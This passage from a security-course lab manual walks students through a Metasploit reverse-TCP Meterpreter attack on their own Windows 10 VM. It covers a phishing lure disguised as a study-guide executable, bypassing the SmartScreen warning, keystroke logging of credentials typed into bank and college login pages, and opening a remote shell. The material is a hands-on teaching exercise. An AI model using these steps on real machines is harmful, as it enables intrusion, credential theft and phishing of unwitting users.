
and text graphics, as shown in Figure 22-1.

![](img/6e921d997751f0a0f87e5170ac9657a1_738_0.png)

# FIGURE 22-1 Welcome to Metasploit!

MSFvenom.

d. At the msf6 exploit(multi/handler) > prompt, enter

```
set LPORT 14618
```

to set the local port that will listen for incoming traffic from the victim machine. Use my choice of 14618. This specifies 14618 as the local port for this exploit module, matching the port configured for the payload with MSFvenom.

You’ll receive the following output confirmation:

```
LPORT => 14618
```

e. At the msf6 exploit(multi/handler) > prompt, enter

```
show options
```

to see information about the payload and exploit.

f. At the msf6 exploit(multi/handler) > prompt, enter

```
exploit
```

to start the magic!

You’ll see output similar to the following (with your IP address instead):

```
[*] Started reverse TCP handler on 192.168.1.114:14618
```

![](img/6e921d997751f0a0f87e5170ac9657a1_741_0.png)

# Step 5 Simulate a victim falling for a phishing attack by downloading and running a malicious file, which will launch the exploit you created earlier.

a. Let’s imagine you receive an e-mail stating that Professor Weissman’s Study Guide offers you a 100 percent guarantee of passing the CompTIA Security+ certification. Wait, it gets even better. All you have to do is click a link and get it for free!

Open up Firefox on the victim machine (Chrome will block the file you’re going to download now and not even give you an opportunity to override its decision). In the address bar, enter http://<IP address of your Kali Linux VM>/WeissmanStudyGuide.exe and press ENTER.

For example, enter the following:
**http://192.168.1.114/WeissmanStudyGuide.exe**

Be sure to use uppercase and lowercase letters for the file, as shown.

In the dialog box that follows, click the Save File button.

+   b. In the Downloads folder, double-click WeissmanStudyGuide.exe to launch it.

+   c. You’ll see the Windows Protected Your PC window, which states, “Microsoft Defender SmartScreen prevented an unrecognized app from starting. Running this app might put your PC at risk.”

It’s likely that users have seen this message many times for legitimate programs, and as a result, they have become desensitized to it. Therefore, letting their security down is not even given a second thought.

Don’t click the Don’t Run button at the bottom right; instead, click the More Info hyperlink at the top.

You’ll see the following:
App: WeissmanStudyGuide.exe
Publisher: Unknown publisher

Click the Run Anyway button at the bottom.

+   d. In the Kali Linux VM, you’ll notice under the **msf6 exploit(multi/handler)** > exploit prompt (with your IP addresses) that you are in business, as shown here:

```
[*] Started reverse TCP handler on 192.168.1.114:14618
[*] Sending stage (201283 bytes) to 192.168.1.121
[*] Meterpreter session 1 opened (192.168.1.114:14618 -> 192.168.1.121:49884)
at 2020-08-14 15:56:49 -0400

meterpreter >
```

The next lab exercise picks up at this exact point. If you are not continuing at this time, you’ll have to reestablish the Meterpreter shell before starting the next lab exercise. Therefore, it’s highly recommended that you continue with the next lab exercise now.

60 MINUTES

# Lab Exercise 22.03: Metasploit’s Meterpreter

Time to use a stealthy, powerful, and extensible payload, Meterpreter, described in the “Let’s Do This” section of the previous lab exercise and at https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/.

# Learning Objectives

In this lab exercise, you’ll continue where you left off in the previous lab exercise and use Metasploit’s Meterpreter payload. At the end of this lab exercise, you’ll be able to

+   - Perform an attack on a Windows 10 system
+   - Understand how parts of the attack relate to incident response

# Lab Materials and Setup

The materials you need for this lab are

+   - The *Principles of Computer Security: CompTIA Security+ and Beyond* textbook
+   - The Windows 10 VM you created in Chapter 1
+   - The Kali Linux VM you created in Chapter 1
+   - The previous lab exercise completed with machines in the state they were at the end of the exercise

# Let’s Do This!

If you are not continuing this lab exercise right after the previous one, power on the Windows 10 VM and the Kali Linux VM.

If your Kali Linux VM is using a different IP address now, you must generate a new payload with MSFvenom, copy it to the root directory of the web server, and download it from the Windows 10 VM. You might as well just go through the entire previous lab exercise again and then continue here.

If your Kali Linux VM is using the same IP address as before, there is no need to generate a new payload with MSFvenom, nor is there a need to redownload the WeissmanStudyGuide.exe file (unless it was deleted) from the Windows 10 VM.

On the Kali Linux VM, restart the Apache web server, launch MSFconsole, and enter the following commands from the previous lab exercise to get back to a Meterpreter shell:

```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP address of your Kali Linux VM>
set LPORT 14618
exploit
```

From the Windows 10 VM, make sure that Real-time Protection is off (it turns itself back on, so if it did, turn it off again) and then double-click the WeissmanStudyGuide.exe file to launch it. You should once again see a Meterpreter shell in the Kali Linux VM.

Now it’s time to see what Meterpreter is all about.

1a–1g

# Step 1 Explore Meterpreter commands for gaining insight and performing actions on the victim machine.

+   a. Start by getting information on the compromised system and its drives:
+       sysinfo

+   b. To see the amount of time that has elapsed since someone used the keyboard of the compromised system (letting you know if someone might respond to this incident right away), enter
+       idletime

+   c. To see a list of every running process on the compromised system, enter
+       ps

+   d. Open up Notepad on the Windows 10 VM. From Meterpreter, enter
+       ps | notepad

CLI window to return to the Meterpreter shell.

2a–2g

# Step 2 Capture keystrokes from the victim machine through Meterpreter.

+   a. It would be helpful for an attacker to capture keystrokes on a victim machine, which could include username/password combinations and the websites those credentials are used on. Keystroke logging could also capture sensitive information typed into a document or e-mail, even if at the last minute the file or e-mail is discarded and not saved or sent. Other URLs and names of programs or files can also be captured and used nefariously.
+   
+   In the Meterpreter shell, enter
+   keyscan_start
+   to start the keystroke sniffer.

+   b. On the Windows 10 VM, open up Notepad and start typing a couple of paragraphs of anything. Be sure to use the arrow keys, BACKSPACE, and DELETE.

+   c. On the Windows 10 VM, open up any browser and go to www.chase.com.

# Note

Throughout this step, you will not be able to sign in with any of the username/password combinations. They are provided to illustrate the keystroke-logging process.

Enter a username of bob and a password of bobpassword in the corresponding textboxes and click the blue Sign In button.

+   d. Go to https://mycourses.rit.edu.
+   
+   Click the RIT Account Login button, enter a username of bob2 and a password of bobpassword2, and click the Log In button.

+   e. Go to https://lms.flcc.edu.

```
ipconfig
netstat
route
```

You’ll notice the outputs for **ifconfig** and **ipconfig** are the same, and that the outputs look different than when those tables are viewed from a Windows command prompt. However, getting to a Windows command prompt from Meterpreter is simple.

b. From Meterpreter, open a command prompt from the compromised machine with the following command:

```
shell
```

c. Now you can execute networking commands as if you were physically in front of the compromised machine.

See the machine’s ARP cache with

```
arp -a
```

d. See the machine’s network configuration with

```
ipconfig /all
```

e. See the machine’s DNS resolver cache with

```
ipconfig /displaydns
```

f. Clear the machine’s DNS resolver cache with

```
ipconfig /flushdns
```

Verify that the entries are gone by executing

```
ipconfig /displaydns
```

again. This could be useful for a DNS cache poisoning attack (covered in Chapter 7).

g. The victim machine can be leveraged by the attacker to be an attacking machine, as the attacker can now willfully send traffic from the victim machine to anywhere.

If you didn’t perform the lab exercises of Chapters 15 or 16, which included installing Wireshark on the Windows 10 VM, install Wireshark now by going to https://www.wireshark.org, clicking in the circle above Download, clicking Windows Installer (64-bit), clicking the Save File button, and then double-clicking the installer in
